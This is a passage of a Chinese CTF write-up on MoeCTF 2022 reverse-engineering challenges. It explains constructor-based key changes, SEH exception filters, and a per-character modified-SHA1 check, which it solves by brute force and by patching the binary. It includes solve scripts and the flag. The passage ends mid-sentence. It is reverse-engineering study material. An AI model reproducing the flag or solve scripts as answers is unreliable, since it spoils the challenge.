<p>然后类似于迭代器,计算end,即init_array的最后一项之后,</p>
<p><code>end = ((char *)&amp;finiArray - (char *)&amp;initArray) &gt;&gt; 3;</code>这里右移三位相当于除以8,原因是<code>_init_array</code>中维护的都是函数入口地址,每个地址都是8字节的,除以八才得到下标</p>
<p>然后begin从0遍历到end,也就是遍历了这个<code>_init_array</code>表</p>
<p>每次遍历都会执行一个<code>((void (__fastcall *)(_QWORD, __int64, __int64))*(&amp;initArray + begin))(a1, a2, a3);</code></p>
<p>把<code>_init_array</code>中的表项,也就是函数入口点,带着(a1,a2,a3)三个参数去执行</p>
<p>显然initArray中有两个表项</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.init_array:0000000000003D88 _init_array     segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.init_array:0000000000003D88                 assume cs:_init_array</span><br><span class="line">.init_array:0000000000003D88                 ;org 3D88h</span><br><span class="line">.init_array:0000000000003D88 initArray       dq offset loc_11E0      ; DATA XREF: LOAD:0000000000000168↑o</span><br><span class="line">.init_array:0000000000003D88                                         ; LOAD:00000000000002F0↑o ...</span><br><span class="line">.init_array:0000000000003D90                 dq offset changeKey</span><br><span class="line">.init_array:0000000000003D90 _init_array     ends</span><br></pre></td></tr></table></figure>
<p>这个changeKey函数是第二个被执行的,显然它用不到a1,a2,a3三个参数.</p>
<p>下面问题是,<code>_libc_csu_init</code>这个函数是干啥的,被谁,在啥时候执行</p>
<p>交叉引用表明只有start函数会调用它</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221110195924354.png"
alt="image-20221110195924354" />
<figcaption aria-hidden="true">image-20221110195924354</figcaption>
</figure>
<p>start是程序入口点,它调用了<code>_libc_start_main</code>,这个函数会同时带着main函数和<code>_libc_csu_init</code>函数作为参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">start</span><span class="params">(__int64 a1, __int64 a2, <span class="type">void</span> (*a3)(<span class="type">void</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *retaddr; <span class="comment">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v4 = v5;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  _libc_start_main(</span><br><span class="line">    (<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> **))main,</span><br><span class="line">    v4,</span><br><span class="line">    &amp;retaddr,</span><br><span class="line">    (<span class="type">void</span> (*)(<span class="type">void</span>))_libc_csu_init,</span><br><span class="line">    fini,</span><br><span class="line">    a3,</span><br><span class="line">    &amp;v5);</span><br><span class="line">  __halt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面问题就是<code>_libc_start_main</code>的逻辑了,这实际上是linux程序从加载到main之前的逻辑,参考程序员的自我修养.留作后话</p>
<p>可以确定的一点是<code>_libc_csu_init</code>是先于main函数执行的,因此main执行之前key已经被修改了</p>
<h4 id="怎么出的题">怎么出的题?</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute((constructor)) <span class="type">static</span> <span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">strcat</span>(key,<span class="string">&quot;TCL,trackYYDS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个fun函数被<code>__attribute((constructor))</code>修饰,这是GNU编译器的拓展语法</p>
<blockquote>
<p>__attribute__介绍</p>
<p>参考<a
target="_blank" rel="noopener" href="https://www.jianshu.com/p/dd425b9dc9db"><strong>attribute</strong>((constructor))用法解析
- 简书 (jianshu.com)</a></p>
<p>__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable
Attribute)和类型属性(Type
Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数</p>
<p>__attribute__语法格式为：attribute ( ( attribute-list ) )</p>
<p>如果函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行；若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。</p>
</blockquote>
<p>是一种比较明显的反调试手段</p>
<h4 id="fake_code">fake_code</h4>
<p>又是异常处理,遗留的问题是,如何过滤异常,只对除零异常感兴趣</p>
<p>这样出的题:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FilterFunc</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">		__try &#123;</span><br><span class="line">            index = (<span class="number">0x7f</span> * index + <span class="number">0x66</span>) % <span class="number">0xff</span>;</span><br><span class="line">            tmp = index &gt;&gt; <span class="number">7</span>;</span><br><span class="line">            tmp = <span class="number">1</span> / tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        __except (FilterFunc(GetExceptionCode())) &#123;</span><br><span class="line">            key = (<span class="number">97</span> * key + <span class="number">101</span>) % <span class="number">233</span>;</span><br><span class="line">            key ^= <span class="number">0x29</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;catch i = %d\n&quot;, i);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>try块中不管发生了什么异常,只要是异常,都会进入except块</p>
<p>这except的参数是调用了FilterFunc函数,给FilterFunc函数传递的参数是GetExceptionCode(),也就是try中发生的异常的类型.</p>
<p>FilterFunc中,当传递的参数是除零异常时,返回EXCEPTION_EXECUTE_HANDLER这么一个枚举值,否则都会返回EXCEPTION_CONTINUE_SEARCH这么一个枚举值</p>
<p>然后except根据FilterFunc的返回值判断是否进入except块,怎么个评判标准呢?</p>
<p>参考<a
target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/debug/exception-handler-syntax">Exception-Handler
Syntax - Win32 apps | Microsoft Learn</a></p>
<table>
<colgroup>
<col style="width: 34%" />
<col style="width: 65%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td
style="text-align: left;"><strong>EXCEPTION_EXECUTE_HANDLER</strong></td>
<td style="text-align: left;">The system transfers control to the
exception handler, and execution continues in the stack frame in which
the handler is
found.<br />系统将控制移交给异常处理函数,也就是当前函数栈帧中的except块</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>EXCEPTION_CONTINUE_SEARCH</strong></td>
<td style="text-align: left;">The system continues to search for a
handler.<br />系统将不是用当前函数栈帧中的except块中的异常处理,而是沿着seh链上溯早期注册的异常处理函数,而早期注册的异常处理函数都是系统注册的或者运行环境注册的,没有针对性,相当于是走个过场,也不会对程序逻辑造成很大的影响.<br />而除零异常会被返回EXCEPTION_EXECUTE_HANDLER,进入云之君自定义的except块,这个块就有实际作用了.</td>
</tr>
<tr>
<td
style="text-align: left;"><strong>EXCEPTION_CONTINUE_EXECUTION</strong></td>
<td style="text-align: left;">The system stops its search for a handler
and returns control to the point at which the exception occurred. If the
exception is noncontinuable, this results in an
<strong>EXCEPTION_NONCONTINUABLE_EXCEPTION</strong>
exception.<br />系统忽略异常,控制还给程序异常点继续执行.<br />如果异常地太厉害执行不动了,将会又触发EXCEPTION_NONCONTINUABLE_EXCEPTION异常</td>
</tr>
</tbody>
</table>
<h3 id="broken_hash">broken_hash</h3>
<h4 id="当时的做法非预期">当时的做法(非预期)</h4>
<p>当时想到一个非预期解,但是认为BYTE,WORD,还有char,int,unsigned等等这些玩意儿转换太费脑子了就没整,实际上不难</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;This is a surprise!&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Give me your flag: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">index = <span class="number">-1</span>i64;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  ++index;</span><br><span class="line"><span class="keyword">while</span> ( input[index] );</span><br><span class="line"><span class="keyword">if</span> ( index == <span class="number">88</span> )</span><br><span class="line">&#123;</span><br><span class="line">  encrypt(input);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">88</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    temp_check = check &amp;&amp; encrypted[i] == target[i];</span><br><span class="line">    check = temp_check;</span><br><span class="line">    <span class="keyword">if</span> ( !temp_check )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7();</span><br><span class="line">  <span class="keyword">if</span> ( check )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, aTtttqqqqqqqlll);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, aWhatAPityPlzTr);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑就是输入要有88个字符,然后encrypt函数对输入进行加密,加密之后密文放在encrypted数组中,再和实现放置的密文target进行比较,全对则通过</p>
<p>关键就在于encrypt这个函数,出题人参考的<a
target="_blank" rel="noopener" href="https://github.com/B-Con/crypto-algorithms/blob/master/sha1.c">crypto-algorithms/sha1.c
at master · B-Con/crypto-algorithms
(github.com)</a>.fake_code这个题里面的SHA1加密代码是直接抄的,然后改了几个参数</p>
<p>sha1加密的主逻辑长这样,函数名还有变量名有修改</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sha1</span><span class="params">(__int64 text)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">char</span> single[<span class="number">12</span>]; <span class="comment">// [rsp+24h] [rbp-B4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> ctx[<span class="number">128</span>]; <span class="comment">// [rsp+30h] [rbp-A8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 hash[<span class="number">24</span>]; <span class="comment">// [rsp+B0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">88</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    single[<span class="number">0</span>] = *(_BYTE *)(text + i);           <span class="comment">// single=text[i]</span></span><br><span class="line">    sha1_init((__int64)ctx);</span><br><span class="line">    sha1_update((__int64)ctx, (__int64)single, <span class="number">1u</span>i64);</span><br><span class="line">    sha1_final((__int64)ctx, (__int64)hash);</span><br><span class="line">    encrypted[i] = hash[<span class="number">0</span>] | (hash[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (hash[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (hash[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)check;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>笑死,sha1加密每次只对一个字符进行,他将输入的88个字符分别进行sha1加密,然后将hash值一通按位或放到encrypted[1]上</p>
<p>对单个字符的加密就失去了sha1加密的意义了,可以暴力枚举单个字符的ascii值然后加密之后encrypted[i]和target[i]直接进行比较,这就解出了input[i]</p>
<p>云之君对sha1加密中的一些参数进行了魔改</p>
<p>首先是sha1_init初始化中的参数</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/init.png"
alt="左原始,右魔改" />
<figcaption aria-hidden="true">左原始,右魔改</figcaption>
</figure>
<p>然后sha1_transform函数中也有魔改</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/sha1_transform_2.png"
alt="sha1_transform_2" />
<figcaption aria-hidden="true">sha1_transform_2</figcaption>
</figure>
<p>原来是<code>m[i] = (m[i] &lt;&lt; 1) | (m[i] &gt;&gt; 31);</code>魔改为<code>m[i] = (m[i] &lt;&lt; 2) | (m[i] &gt;&gt; 30);</code></p>
<p>就这两个改动</p>
<p>下面就可以暴力破解了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sha1.h&quot;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> target[<span class="number">88</span>] = &#123;</span><br><span class="line">    <span class="number">0x64744C9A</span>, <span class="number">0x047C2FF1</span>, <span class="number">0xA2D74292</span>, <span class="number">0x85BEF77E</span>, <span class="number">0x711FCBF7</span>, <span class="number">0x669E1609</span>, <span class="number">0x6BBD9DB6</span>, <span class="number">0x6941C8A4</span>,</span><br><span class="line">    <span class="number">0xB16E48B3</span>, <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0x36568AF5</span>, <span class="number">0xFB8F95A7</span>,</span><br><span class="line">    <span class="number">0x82ACF96A</span>, <span class="number">0x75DCD570</span>, <span class="number">0x7EF00E40</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x4BE9314A</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xA2D74292</span>, <span class="number">0xDE321186</span>,</span><br><span class="line">    <span class="number">0xFB8F95A7</span>, <span class="number">0x46927FA8</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xD7C1A410</span>, <span class="number">0x567375C3</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9C19F0F3</span>,</span><br><span class="line">    <span class="number">0xD035E914</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x0B7D1395</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xC87A7C7E</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD7C1A410</span>,</span><br><span class="line">    <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xBEA99D3B</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>,</span><br><span class="line">    <span class="number">0xD7C1A410</span>, <span class="number">0xDE321186</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x581D99E5</span>, <span class="number">0xA2D74292</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x06372812</span>,</span><br><span class="line">    <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xEF53E254</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F12424D</span>, <span class="number">0x669E1609</span>, <span class="number">0xFB8F95A7</span>,</span><br><span class="line">    <span class="number">0x9C19F0F3</span>, <span class="number">0xFECF7685</span>, <span class="number">0x0B7D1395</span>, <span class="number">0x1833E8B1</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F66DD04</span>, <span class="number">0xA2D74292</span>, <span class="number">0xD7C1A410</span>,</span><br><span class="line">    <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x866CAF4F</span>, <span class="number">0x047C2FF1</span>, <span class="number">0x64744C9A</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xCEDB7952</span>,</span><br><span class="line">    <span class="number">0xDE321186</span>, <span class="number">0x81453D43</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xC578F843</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xDE321186</span>, <span class="number">0xE38C6F07</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sha1</span><span class="params">(BYTE c)</span><span class="comment">//接收一个char作为输入,输出加密之后的值</span></span><br><span class="line">&#123;</span><br><span class="line">    SHA1_CTX ctx;</span><br><span class="line">    BYTE single[<span class="number">12</span>];</span><br><span class="line">    BYTE hash[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line">    single[<span class="number">0</span>] = c;</span><br><span class="line">    sha1_init(&amp;ctx);</span><br><span class="line">    sha1_update(&amp;ctx, single, <span class="number">1</span>);</span><br><span class="line">    sha1_final(&amp;ctx, hash);</span><br><span class="line">    <span class="keyword">return</span> hash[<span class="number">0</span>] | (hash[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | (hash[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (hash[<span class="number">3</span>] &lt;&lt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> t = <span class="number">0</span>; t &lt; <span class="number">88</span>; ++t)<span class="comment">//遍历88次</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> i = <span class="number">20</span>; i &lt; <span class="number">127</span>; ++i)<span class="comment">//每次尝试从20到127的每个ascii值</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (sha1(i) == target[t])<span class="comment">//如果对上了则打印char(i)</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\Broken_hash&gt; g++ main.cpp sha1.c -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\Broken_hash&gt; ./main</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun&#125;</span><br></pre></td></tr></table></figure>
<p>但是看了flag就知道这不是预期解,flag中提到了SEH,但是我没有看到?</p>
<h4 id="预期解">预期解</h4>
<p>云之君一直说,patch程序然后写交互脚本,但是我听不懂她在说啥.看了题解才想明白为啥要这样patch程序</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/loc_140001DEF.png"
alt="loc_140001DEF" />
<figcaption aria-hidden="true">loc_140001DEF</figcaption>
</figure>
<p>把左边第7行的<code>lea rax,dword_140005000</code>改成<code>lea rax,[rsp+E8h+var_C8]</code>,也就是<code>lea rax,[rsp+20h]</code></p>
<p>然后第8行的<code>add rax,160h</code>改成<code>nop</code></p>
<p>这样第9行将rax交给rdx作为参数,实际上就是将var_C8的地址放到了rdx上,然后就要调用printf函数了.var_C8是自变量i的值</p>
<p>这里调用printf打印i值,其目的是啥呢?</p>
<p>蓝色框框里是判断输入的加密是否和已经存储的密文一致,不一致则会跳转黄色框框也就是loc_140001DEF,一致则跳转红色框框报告正确</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221111001926390.png"
alt="image-20221111001926390" />
<figcaption aria-hidden="true">image-20221111001926390</figcaption>
</figure>
<p>如果进入了黄色框框,var_8C也就是循环变量是没有清零的,在黄色框框中调用printf函数打印出var_8C的值,如果var_8C=1就说明第一个输入字符对上号了,此时flag就可以确定第一个字符,然后枚举第二个字符,当var_8C打印出2的时候,flag就确定了第二个字符,以此类推</p>
<p>然而这里能够一个一个字符的确认就是因为sha1每次只对一个字符加密.如果sha1对整个输入同时加密,则这种方法也不能用.</p>
<p>也就是说,只要是"预期解"能用,"非预期解"也能用,两种解法实际上是一个道理</p>
<p>下面研究一下预期解的解密脚本</p>
<h4 id="解密脚本">解密脚本</h4>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;moectf&#123;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">88</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x21</span>,<span class="number">0x7f</span>):</span><br><span class="line">        tmp = flag + <span class="built_in">chr</span>(j) * (<span class="number">88</span> - i)<span class="comment">#开头是已经确定的flag,后面剩余的字符全都使用chr(j)填充,填满88个字符</span></span><br><span class="line"></span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;Broken_hash.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)<span class="comment">#建立子进程,将其三标重定向到管道</span></span><br><span class="line">        p.stdin.write(tmp.encode())<span class="comment">#将tmp输入到子进程 的标准输入</span></span><br><span class="line">        p.stdin.close()<span class="comment">#关闭子进程的标准输入</span></span><br><span class="line">        out = p.stdout.read()<span class="comment">#从子进程标准输出获取输出</span></span><br><span class="line">        p.stdout.close()<span class="comment">#关闭标准输出</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> out[-<span class="number">1</span>] &gt; i:<span class="comment">#out[-1]是out串的最后一个字符,也就是patch程序之后,输出的匹配上的下标i,也就是var_C8,如果匹配成功,则var_C8会比i多一个,否则相等</span></span><br><span class="line">            flag += <span class="built_in">chr</span>(j)<span class="comment">#如果var_C*&gt;i则j添加到flag最后</span></span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">flag += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>执行之后</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\moectfwp\MoeCTF_2022-main\Challenges\Reverse\Broken_hash&gt; python ./solve.py</span><br><span class="line">moectf&#123;F</span><br><span class="line">moectf&#123;F1</span><br><span class="line">moectf&#123;F1n</span><br><span class="line">moectf&#123;F1nd</span><br><span class="line">moectf&#123;F1nd_</span><br><span class="line">moectf&#123;F1nd_t</span><br><span class="line">...</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Ju</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun</span><br><span class="line">moectf&#123;F1nd_th3_SEH_7hen_B1a5t_My_Fla9_and_Y0u_Can_Get_A_Cup_Of_Milk_Tea_From_YunZh1Jun&#125;</span><br></pre></td></tr></table></figure>
<h4 id="subprocess模块">subprocess模块</h4>
<p>subprocess模块允许我们启动一个子进程,并且控制其输入输入输出</p>
<blockquote>
<p><strong>Popen() 方法</strong></p>
<p>Popen 是 subprocess的核心，子进程的创建和管理都靠它处理。</p>
<p>构造函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, </span><br><span class="line">preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, </span><br><span class="line">startupinfo=None, creationflags=0,restore_signals=True, start_new_session=False, pass_fds=(),</span><br><span class="line">*, encoding=None, errors=None)</span><br></pre></td></tr></table></figure>
<p><strong>常用参数：</strong></p>
<ul>
<li>args：shell命令，可以是字符串或者序列类型（如：list，元组）</li>
<li>bufsize：缓冲区大小。当创建标准流的管道对象时使用，默认-1。
0：不使用缓冲区
1：表示行缓冲，仅当universal_newlines=True时可用，也就是文本模式
正数：表示缓冲区大小 负数：表示使用系统默认的缓冲区大小。</li>
<li>stdin, stdout, stderr：分别表示程序的标准输入、输出、错误句柄</li>
<li>preexec_fn：只在 Unix 平台下有效，用于指定一个可执行对象（callable
object），它将在子进程运行之前被调用</li>
<li>shell：如果该参数为 True，将通过操作系统的 shell
执行指定的命令。</li>
<li>cwd：用于设置子进程的当前目录。</li>
<li>env：用于指定子进程的环境变量。如果 env =
